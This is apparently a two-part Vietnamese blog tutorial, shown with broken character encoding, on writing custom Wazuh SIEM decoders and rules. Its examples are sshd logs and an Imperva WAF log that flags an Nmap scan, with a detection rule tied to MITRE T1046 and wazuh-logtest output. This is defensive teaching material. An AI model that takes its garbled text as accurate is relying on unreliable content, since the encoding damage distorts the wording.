TÃªn cá»§a decoder cha Khá»›p vá»›i decoder cha field regex So sÃ¡nh má»™t trÆ°á»ng trong pháº§n order Ä‘Ã£ Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a trong decoder description KÃ½ tá»± báº¥t ká»³ MÃ´ táº£ vá» ná»™i dung cáº£nh bÃ¡o group KÃ½ tá»± báº¥t ká»³ PhÃ¢n loáº¡i cáº£nh bÃ¡o theo nhÃ³m if_sid Danh sÃ¡ch ID Ä‘Æ°á»£c phÃ¢n tÃ¡ch báº±ng dáº¥u pháº©y Giá»‘ng nhÆ° rule con phá»¥ thuá»™c vÃ o rule cha CÃ¡c tÃ¹y chá»n khÃ¡c cÃ³ thá»ƒ Ä‘Æ°á»£c dÃ¹ng trong cÃ¡c trÆ°á»ng há»£p nháº¥t Ä‘á»‹nh tÃ¹y thuá»™c vÃ o Ä‘áº·c Ä‘iá»ƒm ná»™i dung cá»§a cÃ¡c loáº¡i log cÃ³ trong há»‡ thá»‘ng.\nViáº¿t nhÆ° tháº¿ nÃ o? # TÆ°Æ¡ng tá»± nhÆ° decoder, cÃ¡c rules cÅ©ng Ä‘Æ°á»£c viáº¿t dÆ°á»›i dáº¡ng XML, vÃ  nhÆ° cÃ³ Ä‘á» cáº­p á»Ÿ trÃªn, rule Ä‘Æ°á»£c viáº¿t dá»±a trÃªn cÃ¡c trÆ°á»ng cá»§a decoder, ngoÃ i ra chÃºng ta cÅ©ng cÃ³ thá»ƒ dá»±a vÃ o ná»™i dung cá»§a log lÃ m Ä‘iá»u kiá»‡n Ä‘á»ƒ viáº¿t rule má»™t cÃ¡ch chi tiáº¿t nháº¥t.\nCÃ¡c rule nÃ y khÃ´ng nháº¥t thiáº¿t pháº£i sinh theo dáº¡ng cha-con, chÃºng cÃ³ thá»ƒ Ä‘Æ°á»£c táº¡o Ä‘á»™c láº­p vá»›i nhau vÃ  Ä‘áº¡i diá»‡n cho má»™t Ä‘áº·c Ä‘iá»ƒm nÃ o Ä‘Ã³ xuáº¥t hiá»‡n trong decoder.\nTÃ´i sáº½ quay láº¡i vÃ­ dá»¥ nhÆ° Ä‘Ã£ lÃ m á»Ÿ decoder cho cÃ³ tÃ­nh thá»‘ng nháº¥t.\nCEF:0|Imperva Inc.|SecureSphere|10.6.0|Recommended Signatures Policy for Web Applications|Recommended Signatures Policy for Web Applications|High|act=Block dst=10.11.12.13 dpt=443 duser=n/a src=103.187.191.141 spt=36614 proto=TCP rt=Apr 26 2023 13:08:12 cat=Alert cs1=Recommended Signatures Policy for Web Applications cs1Label=Policy cs2=mail.re-toor.vn cs2Label=ServerGroup cs3=mail cs3Label=ServiceName cs4=mail.re-toor.vn cs4Label=ApplicationName cs5=Nmap scanner cs5Label=Description Äáº§u tiÃªn tÃ´i sáº½ cho nÃ³ vÃ o 1 group nháº±m má»¥c Ä‘Ã­ch táº­p há»£p nhÃ³m cÃ¡c loáº¡i rule dá»±a trÃªn log cÃ³ cÃ¹ng Ä‘áº·c Ä‘iá»ƒm chung. VÃ­ dá»¥ nhÆ° log trÃªn nháº­n Ä‘Æ°á»£c dÆ°á»›i dáº¡ng CEF (Common Event Format) vÃ  Ä‘Ã¢y lÃ  log cá»§a Imperva, nÃªn tÃ´i sáº½ cho cÃ¡c rule nÃ y vÃ o nhÃ³m Imperva vÃ  CEF\n\u0026lt;group name=\u0026#34;Imperva,CEF,\u0026#34;\u0026gt; \u0026lt;/group\u0026gt; BÃ¢y giá» cÃ¡c rule vá» Imperva sáº½ Ä‘Æ°á»£c viáº¿t bÃªn trong group nÃ y.\nMáº·c dÃ¹ rule khÃ´ng cáº§n thiáº¿t pháº£i viáº¿t dÆ°á»›i dáº¡ng cha-con, nhÆ°ng Ä‘á»ƒ cho rÃµ rÃ ng vÃ  cÃ³ há»‡ thá»‘ng, tÃ´i váº«n sáº½ táº¡o rule Ä‘áº§u tiÃªn chá»©a decoder mÃ  rule sáº½ phá»¥ thuá»™c vÃ  thÃªm mÃ´ táº£ cho nÃ³, coi nÃ³ giá»‘ng nhÆ° rule cha. Táº¥t cáº£ cÃ¡c rule tiáº¿p theo chá»‰ cáº§n phá»¥ thuá»™c vÃ o cha thÃ¬ sáº½ khÃ´ng cáº§n khai bÃ¡o láº¡i decoder ná»¯a.\n\u0026lt;rule id=\u0026#34;82002\u0026#34; level=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;decoded_as\u0026gt;Imperva\u0026lt;/decoded_as\u0026gt; \u0026lt;description\u0026gt;WAF messages grouped.\u0026lt;/description\u0026gt; \u0026lt;/rule\u0026gt; Má»—i rule khi sinh ra Ä‘á»u pháº£i cÃ³ id vÃ  level - má»©c Ä‘á»™ nghiÃªm trá»ng. Level sáº½ quyáº¿t Ä‘á»‹nh xem rule nÃ o Ä‘Æ°á»£c coi lÃ  cáº£nh bÃ¡o (alert) xuáº¥t hiá»‡n trÃªn dashboard cÃ²n rule nÃ o thÃ¬ khÃ´ng. Tiáº¿p theo, \u0026lt;decoder_as\u0026gt; lÃ  trÆ°á»ng dÃ¹ng dá»ƒ xÃ¡c Ä‘á»‹nh rule nÃ y dá»±a tren decoder nÃ o. Cuá»‘i cÃ¹ng lÃ  \u0026lt;description\u0026gt; lÃ  mÃ´ táº£ cá»§a rule, trÃªn dashboard cá»§a tÃ´i sáº½ sáº½ hiá»‡n mÃ´ táº£ nÃ y.\nCáº¥u hÃ¬nh máº·c Ä‘á»‹nh cá»§a Wazuh cho chÃºng ta cáº£nh bÃ¡o tá»« level 3, nghÄ©a lÃ  cÃ¡c log thuá»™c level 0 - 2 sáº½ khÃ´ng Ä‘Æ°á»£c coi lÃ  alert vÃ  khÃ´ng hiá»‡n trÃªn dashboard. TÃ´i sáº½ cÅ©ng Ä‘á»ƒ theo cáº¥u hÃ¬nh máº·c Ä‘á»‹nh cá»§a Wazuh. Thá»±c ra viá»‡c Ä‘á»ƒ cáº¥u hÃ¬nh level bao nhiÃªu khÃ´ng quan trá»ng vÃ¬ tÃ´i cÃ³ thá»ƒ sá»­a Ä‘Æ°á»£c level cá»§a rule theo má»©c Ä‘á»™ nghiÃªm trá»ng vÃ  theo cáº¥u hÃ¬nh cá»§a Wazuh.\nBÃ¢y giá» tÃ´i sáº½ xÃ¡c Ä‘á»‹nh xem log nÃ y cÃ³ nhá»¯ng gÃ¬ Ä‘á»ƒ cÃ³ thá»ƒ lÃ  Ä‘iá»u kiá»‡n Ä‘á»ƒ viáº¿t rule cáº£nh bÃ¡o. Äá»ƒ Ã½ 1 chÃºt thÃ¬ tÃ´i cÃ³ trÆ°á»ng cs5Label cÃ³ giÃ¡ trá»‹ lÃ  Description, cÃ³ thá»ƒ suy ra trÆ°á»ng nÃ y lÃ  miÃªu táº£ cho trÆ°á»ng cs5. cs5 cÃ³ giÃ¡ trá»‹ lÃ  Nmap scanner, váº­y thÃ¬ trÆ°á»ng cÃ³ thá»ƒ lÃ  Ä‘áº¡i diá»‡n cho ná»™i dung cá»§a log nÃ y, tÃ´i cÃ³ thá»ƒ dá»±a vÃ o cs5 lÃ m Ä‘iá»u kiá»‡n phá»¥ thuá»™c Ä‘á»ƒ viáº¿t rule.\n\u0026lt;rule id=\u0026#34;82023\u0026#34; level=\u0026#34;12\u0026#34;\u0026gt; \u0026lt;if_sid\u0026gt;82002\u0026lt;/if_sid\u0026gt; \u0026lt;match\u0026gt;Nmap scanner\u0026lt;/match\u0026gt; \u0026lt;description\u0026gt;$(cs5)\u0026lt;/description\u0026gt; \u0026lt;mitre\u0026gt; \u0026lt;id\u0026gt;T1046\u0026lt;/id\u0026gt; \u0026lt;/mitre\u0026gt; \u0026lt;/rule\u0026gt; TÃ´i Ä‘áº·t id cá»§a rule nÃ y lÃ  82023. Vá»›i level 12 thÃ¬ rule nÃ y sáº½ sinh ra alert á»Ÿ má»©c Critical - nghiÃªm trá»ng vÃ  sáº½ bÃ¡o Ä‘á» trÃªn dashboard, nháº±m thÃ´ng bÃ¡o cho quáº£n trá»‹ viÃªn biáº¿t há»‡ thá»‘ng Ä‘ang bá»‹ rÃ² quÃ©t port.\nVá»›i \u0026lt;if_sid\u0026gt; 82002 nghÄ©a lÃ  rule 82023 nÃ y sáº½ phá»¥ thuá»™c vÃ o rule 82002, náº¿u log khÃ´ng Ä‘Æ°á»£c phÃ¡t hiá»‡n bá»Ÿi 82002 thÃ¬ 82023 cÅ©ng sáº½ khÃ´ng Ä‘Æ°á»£c kÃ­ch hoáº¡t.\nTrÆ°á»ng \u0026lt;match\u0026gt; dÃ¹ng Ä‘á»ƒ xÃ¡c Ä‘á»‹nh kÃ½ tá»± tá»“n táº¡i trong log. Náº¿u nhÆ° trong log cÃ³ xuáº¥t hiá»‡n text \u0026ldquo;Nmap scanner\u0026rdquo; thÃ¬ rule nÃ y sáº½ Ä‘Æ°á»£c kÃ­ch hoáº¡t.\n\u0026lt;description\u0026gt; sá»­ dá»¥ng $(cs5) chá»‰ Ä‘á»‹nh ráº±ng náº¿u rule nÃ y Ä‘Æ°á»£c kÃ­ch hoáº¡t thÃ¬ mÃ´ táº£ cá»§a cáº£nh bÃ¡o nÃ y sáº½ xuáº¥t hiá»‡n vá»›i ná»™i dung cá»§a trÆ°á»ng cs5\nCÃ²n \u0026lt;mitre\u0026gt; lÃ  trÆ°á»ng dÃ¹ng Ä‘á»ƒ gáº¯n cÃ¡c ká»¹ thuáº­t Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a táº¡i MITRE ATT\u0026amp;CKÂ®. Äá»ƒ gáº¯n Ä‘Æ°á»£c giÃ¡ trá»‹ nÃ y cáº§n cÃ³ hiá»ƒu biáº¿t vá» nÃ³. TÃ´i sáº½ viáº¿t vá» pháº§n nÃ y trong 1 bÃ i riÃªng.\nCuá»‘i cÃ¹ng tÃ´i cÃ³ rule cÆ¡ báº£n nhÆ° sau:\n\u0026lt;group name=\u0026#34;Imperva,CEF,\u0026#34;\u0026gt; \u0026lt;rule id=\u0026#34;82002\u0026#34; level=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;decoded_as\u0026gt;Imperva\u0026lt;/decoded_as\u0026gt; \u0026lt;description\u0026gt;WAF messages grouped.\u0026lt;/description\u0026gt; \u0026lt;/rule\u0026gt; \u0026lt;rule id=\u0026#34;82023\u0026#34; level=\u0026#34;12\u0026#34;\u0026gt; \u0026lt;if_sid\u0026gt;82002\u0026lt;/if_sid\u0026gt; \u0026lt;match\u0026gt;Nmap scanner\u0026lt;/match\u0026gt; \u0026lt;description\u0026gt;$(cs5)\u0026lt;/description\u0026gt; \u0026lt;mitre\u0026gt; \u0026lt;id\u0026gt;T1046\u0026lt;/id\u0026gt; \u0026lt;/mitre\u0026gt; \u0026lt;/rule\u0026gt; \u0026lt;/group\u0026gt; Kiá»ƒm tra rule vá»›i wazuh-logtest\nroot@dc-siemtest:/home/siemadmin# /var/ossec/bin/wazuh-logtest Starting wazuh-logtest v4.4.5 Type one log per line CEF:0|Imperva Inc.|SecureSphere|10.6.0|Recommended Signatures Policy for Web Applications|Recommended Signatures Policy for Web Applications|High|act=Block dst=10.11.12.13 dpt=443 duser=n/a src=103.187.191.141 spt=36614 proto=TCP rt=Apr 26 2023 13:08:12 cat=Alert cs1=Recommended Signatures Policy for Web Applications cs1Label=Policy cs2=mail.re-toor.vn cs2Label=ServerGroup cs3=mail cs3Label=ServiceName cs4=mail.re-toor.vn cs4Label=ApplicationName cs5=Nmap scanner cs5Label=Description **Phase 1: Completed pre-decoding. full event: \u0026#39;CEF:0|Imperva Inc.|SecureSphere|10.6.0|Recommended Signatures Policy for Web Applications|Recommended Signatures Policy for Web Applications|High|act=Block dst=10.11.12.13 dpt=443 duser=n/a src=103.187.191.141 spt=36614 proto=TCP rt=Apr 26 2023 13:08:12 cat=Alert cs1=Recommended Signatures Policy for Web Applications cs1Label=Policy cs2=mail.re-toor.vn cs2Label=ServerGroup cs3=mail cs3Label=ServiceName cs4=mail.re-toor.vn cs4Label=ApplicationName cs5=Nmap scanner cs5Label=Description\u0026#39; **Phase 2: Completed decoding. name: \u0026#39;Imperva\u0026#39; action: \u0026#39;Block\u0026#39; application: \u0026#39;SecureSphere\u0026#39; cat: \u0026#39;Alert\u0026#39; cs1: \u0026#39;Recommended Signatures Policy for Web Applications\u0026#39; cs1Label: \u0026#39;Policy\u0026#39; cs2: \u0026#39;mail.re-toor.vn\u0026#39; cs2Label: \u0026#39;ServerGroup\u0026#39; cs3: \u0026#39;mail\u0026#39; cs3Label: \u0026#39;ServiceName\u0026#39; cs4: \u0026#39;mail.re-toor.vn\u0026#39; cs4Label: \u0026#39;ApplicationName\u0026#39; cs5: \u0026#39;Nmap scanner\u0026#39; dpt: \u0026#39;443\u0026#39; dst: \u0026#39;10.11.12.13\u0026#39; duser: \u0026#39;n/a\u0026#39; event.name: \u0026#39;Recommended Signatures Policy for Web Applications\u0026#39; event.type: \u0026#39;Recommended Signatures Policy for Web Applications\u0026#39; protocol: \u0026#39;TCP\u0026#39; rt: \u0026#39;Apr 26 2023 13:08:12\u0026#39; severity: \u0026#39;High\u0026#39; src: \u0026#39;103.187.191.141\u0026#39; version: \u0026#39;10.6.0\u0026#39; **Phase 3: Completed filtering (rules). id: \u0026#39;82023\u0026#39; level: \u0026#39;12\u0026#39; description: \u0026#39;Nmap scanner\u0026#39; groups: \u0026#39;[\u0026#39;Imperva\u0026#39;, \u0026#39;CEF\u0026#39;]\u0026#39; firedtimes: \u0026#39;1\u0026#39; mail: \u0026#39;True\u0026#39; mitre.id: \u0026#39;[\u0026#39;T1046\u0026#39;]\u0026#39; mitre.tactic: \u0026#39;[\u0026#39;Discovery\u0026#39;]\u0026#39; mitre.technique: \u0026#39;[\u0026#39;Network Service Discovery\u0026#39;]\u0026#39; **Alert to be generated. NhÆ° váº­y lÃ  rule Ä‘Ã£ Ä‘Æ°á»£c táº¡o thÃ nh cÃ´ng.\nPháº§n káº¿t # Vá»›i Wazuh, decoder vÃ  rule Ä‘á»u Ä‘Æ°á»£c chia lÃ m 2 pháº§n lÃ  máº·c Ä‘á»‹nh vÃ  tÃ¹y chá»‰nh.\nOption Path Default /var/ossec/ruleset Custom /var/ossec/etc Pháº§n máº·c Ä‘á»‹nh (default) lÃ  cÃ¡c decoders vÃ  rules Ä‘Æ°á»£c Wazuh viáº¿t sáºµn, khÃ´ng thá»ƒ thay Ä‘á»•i hay ghi Ä‘Ã¨ cÃ¡c file nÃ y á»Ÿ trÃªn dashboard. VÃ  cho dÃ¹ tÃ´i cÃ³ cá»‘ gáº¯ng thay Ä‘á»•i nÃ³ báº±ng viá»‡c chá»‰nh sá»­a file trong server, thÃ¬ khi cáº­p nháº­t cÃ¡c phiÃªn báº£n má»›i cá»§a Wazuh, má»i thay Ä‘á»•i cá»§a tÃ´i cÅ©ng sáº½ quay vá» máº·c Ä‘á»‹nh. TÃ´i chá»‰ cÃ³ thá»ƒ táº¡o rule má»›i vÃ  ghi Ä‘á» vÃ o rule cÅ© vá»›i lá»‡nh overwrite\nPháº§n custom lÃ  cÃ¡c decoders vÃ  rule Ä‘Æ°á»£c ngÆ°á»i quáº£n trá»‹ tá»± táº¡o.\nLÆ°u Ã½: decoders vÃ  rules chá»‰ cÃ³ thá»ƒ Ä‘Æ°á»£c kÃ­ch hoáº¡t náº¿u náº±m Ä‘Ãºng vá»‹ trÃ­ trong cÃ¡c thÆ° má»¥c phÃ­a trÃªn.\nMá»—i rule vÃ  decoder khi Ä‘Æ°á»£c táº¡o má»›i hay cÃ³ báº¥t ká»³ thay Ä‘á»•i gÃ¬ Ä‘á»u pháº£i restart láº¡i Wazuh-manager. TÃ´i Ä‘Ã£ táº¡o vÃ  cáº­p nháº­t custom decoders - rules cá»§a mÃ¬nh á»Ÿ Ä‘Ã¢y.\n","date":"2 June 2023","externalUrl":null,"permalink":"/soc/wazuh-custom-rules-and-decoders-part-2/","section":"SOC","summary":"","title":"Viáº¿t Decoders vÃ  Rules cho há»‡ thá»‘ng Wazuh - Part 2","type":"soc"},{"content":" Äá»ƒ lÃ m gÃ¬? # Wazuh lÃ  há»‡ thá»‘ng log táº­p trung, nÃ³ sáº½ thu tháº­p log tá»« táº¥t cáº£ cÃ¡c nguá»“n Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh, phÃ¢n tÃ­ch log vÃ  tá»« Ä‘Ã³ Ä‘Æ°a ra thÃ´ng tin hoáº·c cáº£nh bÃ¡o cho ngÆ°á»i quáº£n trá»‹. Tuy nhiÃªn, Ä‘á»ƒ Wazuh cÃ³ thá»ƒ hiá»ƒu vÃ  phÃ¢n tÃ­ch Ä‘Æ°á»£c nhá»¯ng gÃ¬ nÃ³ Ä‘Ã£ nháº­n thÃ¬ cáº§n chuyá»ƒn Ä‘á»•i nhá»¯ng dá»¯ liá»‡u Ä‘Ã³ sang dáº¡ng ngÃ´n ngá»¯ cá»§a Wazuh.\nLog lÃ  má»™t dáº¡ng nháº­t kÃ½ cÃ³ cáº¥u trÃºc, ghi láº¡i liÃªn tá»¥c cÃ¡c thÃ´ng bÃ¡o vá» hoáº¡t Ä‘á»™ng cá»§a cáº£ há»‡ thá»‘ng hoáº·c cá»§a cÃ¡c dá»‹ch vá»¥ Ä‘Æ°á»£c triá»ƒn khai trÃªn há»‡ thá»‘ng vÃ  file tÆ°Æ¡ng á»©ng. TÃ¹y vÃ o cÃ¡c há»‡ thá»‘ng vÃ  cÃ¡c tiáº¿n trÃ¬nh khÃ¡c nhau mÃ  log sinh ra sáº½ Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a theo cÃ¡c trÆ°á»ng, cÃ¡c thÃ´ng tin trong log sáº½ tÆ°Æ¡ng á»©ng vá»›i giÃ¡ trá»‹ cá»§a cÃ¡c trÆ°á»ng Ä‘Ã³.\nVÃ­ dá»¥\nDec 25 20:45:02 MyHost example[12345]: User \u0026#39;admin\u0026#39; logged from \u0026#39;192.168.1.100\u0026#39; Khi nhÃ¬n vÃ o log nÃ y tÃ´i cÃ³ thá»ƒ Ä‘á»‹nh nghÄ©a ra cÃ¡c cÃ¡c trÆ°á»ng cá»‘ Ä‘á»‹nh á»©ng vá»›i giÃ¡ trá»‹ thay Ä‘á»•i nhÆ° time:Dec 25 20:45:02, user:admin, ip:192.168.1.100.\nWazuh cÅ©ng váº­y, nÃ³ dá»±a vÃ o cÃ¡c trÆ°á»ng Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a Ä‘á»ƒ cÃ³ thá»ƒ hiá»ƒu vÃ  phÃ¢n tÃ­ch Ä‘Æ°á»£c log mÃ  nÃ³ Ä‘Ã£ nháº­n. VÃ  viá»‡c cá»§a chÃºng ta lÃ  dá»±a vÃ o nhá»¯ng log mÃ  há»‡ thá»‘ng sinh ra, Ä‘á»‹nh nghÄ©a chÃºng thÃ nh cÃ¡c trÆ°á»ng Ä‘á»ƒ Wazuh hiá»ƒu Ä‘Æ°á»£c vÃ  Ä‘Æ°a ra cáº£nh bÃ¡o dá»±a trÃªn nÃ³. Hiá»ƒu Ä‘Æ¡n giáº£n lÃ  dá»‹ch láº¡i cÃ¡c ngÃ´n ngá»¯ khÃ¡c thÃ nh ngÃ´n ngá»¯ cá»§a Wazuh Ä‘á»ƒ nÃ³ hiá»ƒu Ä‘Æ°á»£c vÃ  giao tiáº¿p láº¡i Ä‘Æ°á»£c vá»›i chÃºng ta.\nÄá»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u nÃ y, ta cáº§n quan tÃ¢m 2 pháº§n: Decoders vÃ  Rules\nDecoders # LÃ  gÃ¬? Äá»ƒ lÃ m gÃ¬? # Hiá»ƒu Ä‘Æ¡n giáº£n thÃ¬ decoders lÃ  trÃ¬nh biÃªn dá»‹ch log Ä‘á»ƒ Wazuh Ä‘á»c Ä‘Æ°á»£c vÃ  hiá»ƒu Ä‘Æ°á»£c log Ä‘Ã³.\nDecoders Ä‘Æ°á»£c viáº¿t dÆ°á»›i dáº¡ng XML.\nTrÆ°á»›c tiÃªn, Ä‘á»ƒ viáº¿t Ä‘Æ°á»£c thÃ¬ ta cáº§n hiá»ƒu cÃ¡c tÃ¹y chá»n Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ cáº¥u hÃ¬nh nÃªn cÃ¡c decoder. Documentation cá»§a Wazuh Ä‘Ã£ Ä‘á»‹nh nghÄ©a Ä‘áº§y Ä‘á»§ cÃ¡c tÃ¹y chá»n cÃ³ thá»ƒ sá»­ dá»¥ng. NhÆ°ng trong bÃ i nÃ y tÃ´i sáº½ chá»‰ liá»‡t kÃª nhá»¯ng tÃ¹y chá»n quan trá»ng hay dÃ¹ng nháº¥t.\nOption Values Description decoder Báº¥t ká»³ TÃªn decoder parent TÃªn decoder XÃ¡c Ä‘á»‹nh decoder nÃ o lÃ  cha Ä‘á»ƒ cÃ¡c thÃ nh pháº§n cá»§a decoder con sáº½ tham chiáº¿u Ä‘áº¿n nÃ³ program_name regex,sregexÂ hoáº·cÂ pcre2 Äáº·t tÃªn chÆ°Æ¡ng trÃ¬nh lÃ m Ä‘iá»u kiá»‡n Ä‘á»ƒ Ã¡p dá»¥ng bá»™ giáº£i mÃ£ prematch regexÂ hoáº·cÂ pcre2 Äáº·t biá»ƒu thá»©c chÃ­nh quy lÃ m Ä‘iá»u kiá»‡n Ä‘á»ƒ Ã¡p dá»¥ng bá»™ giáº£i mÃ£ regex regexÂ hoáº·cÂ pcre2 TÃ¬m cÃ¡c trÆ°á»ng vÃ  Ä‘á»‹nh nghÄ©a chÃºng order order table XÃ¡c Ä‘á»‹nh tÃªn cá»§a cÃ¡c trÆ°á»ng vá»«a Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a type type table PhÃ¢n loáº¡i cÃ¡c log theo nhÃ³m CÃ¡c tÃ¹y chá»n khÃ¡c cÃ³ thá»ƒ Ä‘Æ°á»£c dÃ¹ng trong cÃ¡c trÆ°á»ng há»£p nháº¥t Ä‘á»‹nh tÃ¹y thuá»™c vÃ o Ä‘áº·c Ä‘iá»ƒm ná»™i dung cá»§a cÃ¡c loáº¡i log cÃ³ trong há»‡ thá»‘ng.\nViáº¿t nhÆ° tháº¿ nÃ o? # CÃ³ thá»ƒ tháº¥y viá»‡c Ä‘áº§u tiÃªn khi viáº¿t decoders lÃ  pháº£i táº¡o decoder cha bÃªn trong cÃ³ chá»©a program_name, cÃ¡c decoders phÃ­a sau sáº½ gáº¯n parent lÃ  tÃªn cá»§a decoder cha vÃ  thÃªm cÃ¡c options prematch, regex, order,\u0026hellip;\nTÃ´i sáº½ láº¥y vÃ­ dá»¥ vá» máº«u log cÃ³ sáºµn trong táº­p decoders máº·c Ä‘á»‹nh cá»§a Wazuh\nMay 10 11:13:40 jitauat sshd[112623]: Accepted password for root from 10.10.3.100 port 8266 ssh2 Log nÃ y cÃ³ ná»™i dung vá» Ä‘Äƒng nháº­p thÃ nh cÃ´ng dá»‹ch vá»¥ ssh vá»›i user root tá»« IP 10.10.3.100 port 8266. PhÃ¢n tÃ­ch log Ä‘á»ƒ xÃ¡c Ä‘á»‹nh cÃ¡c trÆ°á»ng\nMay 10 11:13:40: thá»i Ä‘iá»ƒm login vÃ o ssh jitauat: tÃªn hostname sshd: tÃªn dá»‹ch vá»¥ root: user Ä‘Ã­ch 10.10.3.100: IP nguá»“n 8266: port nguá»“n Váº­y thÃ¬ tÃ´i sáº½ táº¡o ra má»™t decoder cha láº¥y tÃªn lÃ  sshd Ä‘á»ƒ Ä‘á»‹nh nghÄ©a dá»‹ch vá»¥ SSH vÃ  program_name lÃ  sshd Ä‘á»ƒ xÃ¡c Ä‘á»‹nh Ä‘iá»u kiá»‡n cá»§a decoder, nghÄ©a lÃ  báº¥t ká»³ log nÃ o cÃ³ chá»©a sshd thÃ¬ Wazuh sáº½ hiá»ƒu vÃ  gÃ¡n nÃ³ vÃ o decoder nÃ y.\n\u0026lt;decoder name=\u0026#34;sshd\u0026#34;\u0026gt; \u0026lt;program_name\u0026gt;^sshd\u0026lt;/program_name\u0026gt; \u0026lt;/decoder\u0026gt; Tiáº¿p theo, tÃ´i sáº½ táº¡o thÃªm cÃ¡c decoder con bÃªn dÆ°á»›i Ä‘á»ƒ Ä‘á»‹nh nghÄ©a cÃ¡c trÆ°á»ng cÃ³ trong log.\nÄáº§u tiÃªn pháº£i cÃ³ parent vá»›i tÃªn cá»§a decoder cha lÃ  sshd. prematch cÃ³ thá»ƒ chá»©a giÃ¡ trá»‹ thay Ä‘á»•i xuáº¥t hiá»‡n trong log. VÃ­ dá»¥, sá»± kiá»‡n login thÃ nh cÃ´ng thÃ¬ log cá»§a nÃ³ sáº½ chá»©a \u0026ldquo;Accepted\u0026rdquo; hoáº·c \u0026ldquo;Success\u0026rdquo;.\nVá»›i regex, Wazuh decoders sá»­ dá»¥ng cÃ¡c biá»ƒu thá»©c chÃ­nh quy Ä‘á»ƒ trÃ­ch xuáº¥t cÃ¡c giÃ¡ trá»‹ thay Ä‘á»•i vÃ  order sáº½ gÃ¡n cÃ¡c giÃ¡ trá»‹ Ä‘Ã³ vá»›i cÃ¡c trÆ°á»ng mÃ  chÃºng ta muá»‘n Ä‘á»‹nh nghÄ©a\n\u0026lt;decoder name=\u0026#34;sshd-success\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;sshd\u0026lt;/parent\u0026gt; \u0026lt;prematch\u0026gt;^Accepted\u0026lt;/prematch\u0026gt; \u0026lt;regex offset=\u0026#34;after_prematch\u0026#34;\u0026gt;^ \\S+ for (\\S+) from (\\S+) port (\\S+)\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;user, srcip, srcport\u0026lt;/order\u0026gt; \u0026lt;fts\u0026gt;name, user, location\u0026lt;/fts\u0026gt; \u0026lt;/decoder\u0026gt; VÃ­ dá»¥ vá» má»™t decoder cá»§a má»™t log khÃ¡c cÅ©ng thuá»™c sshd\n2020-03-25 08:23:20.933154-0700 localhost sshd[9265]: Connection reset by authenticating user user 192.168.33.1 port 51772 [preauth] Decoder sáº½ Ä‘Æ°á»£c viáº¿t nhÆ° nhau\n\u0026lt;decoder name=\u0026#34;sshd-reset\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;sshd\u0026lt;/parent\u0026gt; \u0026lt;prematch\u0026gt;Connection reset\u0026lt;/prematch\u0026gt; \u0026lt;regex offset=\u0026#34;after_prematch\u0026#34;\u0026gt;(\\S+) (\\S+) port (\\d+)\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;user, srcip, srcport\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; CÃº phÃ¡p biá»ƒu thá»©c chÃ­nh quy # Regular expressions - Biá»ƒu thá»©c chÃ­nh quy lÃ  táº­p há»£p cÃ¡c máº«u dÃ¹ng Ä‘á»ƒ tÃ¬m kiáº¿m cÃ¡c bá»™ kÃ­ tá»± Ä‘Æ°á»£c káº¿t há»£p vá»›i nhau trong cÃ¡c chuá»—i kÃ­ tá»±. Wazuh cÅ©ng sá»­ dá»¥ng nhá»¯ng regex Ä‘Ã£ ráº¥t phá»• biáº¿n Ä‘á»ƒ xÃ¡c Ä‘á»‹nh cÃ¡c máº«u.\nÄá»c thÃªm vÃ  thá»±c hÃ nh vá» regex á»Ÿ Ä‘Ã¢y\nTrong documentation cá»§a Wazuh cÃ³ sá»­ dá»¥ng 3 loáº¡i regex. TÃ´i sáº½ chá»‰ tá»•ng há»£p láº¡i nhá»¯ng gÃ¬ tÃ´i hay dÃ¹ng\nExpressions Valid characters \\w A-Z, a-z, 0-9, -, @, _ \\d 0-9 \\s Spaces \u0026quot; \u0026quot; \\t Tabs \\S Má»i kÃ½ tá»± khÃ´ng thuá»™c \\s \\. Táº¥t cáº£ Modifiers\nExpressions Action + Khá»›p vá»›i 1 hoáº·c nhiá»u láº§n * Khá»›p vá»›i 0 hoáº·c nhiá»u láº§n Special characters\nExpressions Action ^ XÃ¡c Ä‘á»‹nh pháº§n Ä‘áº§u cá»§a vÄƒn báº£n $ XÃ¡c Ä‘á»‹nh pháº§n cuá»‘i cá»§a vÄƒn báº£n | Táº¡o má»™t logic hoáº·c ngÄƒn cÃ¡ch giá»¯a 2 máº«u Characters escaping\n$ ( ) \\ | \u0026lt; \\$ \\( \\) \\\\ \\| \\\u0026lt; VÃ­ dá»¥ thá»±c táº¿ # TÃ´i sáº½ láº¥y vÃ­ dá»¥ vá» má»™t log thá»±c táº¿ trong quÃ¡ trÃ¬nh lÃ m viá»‡c cá»§a mÃ¬nh (táº¥t nhiÃªn lÃ  ná»™i dung log Ä‘Ã£ Ä‘Æ°á»£c sá»­a Ä‘á»•i)\nCEF:0|Imperva Inc.|SecureSphere|10.6.0|Recommended Signatures Policy for Web Applications|Recommended Signatures Policy for Web Applications|High|act=Block dst=10.11.12.13 dpt=443 duser=n/a src=103.187.191.141 spt=36614 proto=TCP rt=Apr 26 2023 13:08:12 cat=Alert cs1=Recommended Signatures Policy for Web Applications cs1Label=Policy cs2=mail.re-toor.vn cs2Label=ServerGroup cs3=mail cs3Label=ServiceName cs4=mail.re-toor.vn cs4Label=ApplicationName cs5===Nmap== scanner cs5Label=Description Kiá»ƒm tra decoder vá»›i wazuh-logtest\nroot@dc-siemtest:/home/siemadmin# /var/ossec/bin/wazuh-logtest Starting wazuh-logtest v4.4.5 Type one log per line CEF:0|Imperva Inc.|SecureSphere|10.6.0|Recommended Signatures Policy for Web Applications|Recommended Signatures Policy for Web Applications|High|act=Block dst=10.11.12.13 dpt=443 duser=n/a src=103.187.191.141 spt=36614 proto=TCP rt=Apr 26 2023 13:08:12 cat=Alert cs1=Recommended Signatures Policy for Web Applications cs1Label=Policy cs2=mail.re-toor.vn cs2Label=ServerGroup cs3=mail cs3Label=ServiceName 